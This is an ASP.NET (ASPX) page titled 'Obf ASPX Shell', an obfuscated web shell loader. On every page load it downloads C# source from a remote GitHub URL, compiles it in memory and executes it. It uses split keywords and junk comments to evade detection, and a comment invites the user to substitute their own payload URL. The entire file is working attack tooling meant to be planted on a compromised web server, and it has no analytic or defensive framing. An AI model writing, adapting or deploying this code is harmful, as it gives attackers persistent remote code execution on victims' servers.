<%@ page Language="C#" %>
<%@ import Namespace="System.Net" %>
<%@ import Namespace="System.CodeDom.Compiler" %>
<%@ import Namespace="Microsoft.CSharp" %>
<%@ import Namespace="System.Reflection" %>
<!DOCTYPE html>
<html>
<head><title>Obf ASPX Shell</title></head>
<script runat="server"> /*junk_1*/
    protected void Page_Load(object sender, EventArgs e)
    {
        string url = "https://raw.githubusercontent.com/neurodie/hxc/refs/heads/main/uploader/up_asp.aspx"; /*junk_2*/ // ganti URL mu
        string code = new WebClient().DownloadString(url); /*junk_3*/
        ExecuteDynamic(code); /*junk_4*/
    }
    private void ExecuteDynamic(string userCode) /*junk_5*/
    {
        string assemblyCode = "u" + "sing System; u" + "sing System.Web; na" + "mespace DynNS { pu" + "blic class DynClass { pu" + "blic object RunCode() { " + userCode + " re" + "turn null; } } }"; /*junk_6*/
        CSharpCodeProvider provider = new CSharpCodeProvider(); /*junk_7*/
        CompilerParameters params_ = new CompilerParameters { GenerateInMemory = true }; /*junk_8*/
        params_.ReferencedAssemblies.Add("System.dll"); /*junk_9*/
        params_.ReferencedAssemblies.Add("System.Web.dll"); /*junk_10*/
        CompilerResults results = provider.CompileAssemblyFromSource(params_, assemblyCode); /*junk_11*/
        if (results.Errors.HasErrors) { Response.Write("Err: " + results.Errors[0].ErrorText); return; } /*junk_12*/
        object instance = results.CompiledAssembly.CreateInstance("DynNS.DynClass"); /*junk_13*/
        if (instance != null) { instance.GetType().InvokeMember("RunCode", BindingFlags.InvokeMethod, null, instance, null); } /*junk_14*/
    }
</script> /*junk_15*/
<body></body>
</html>
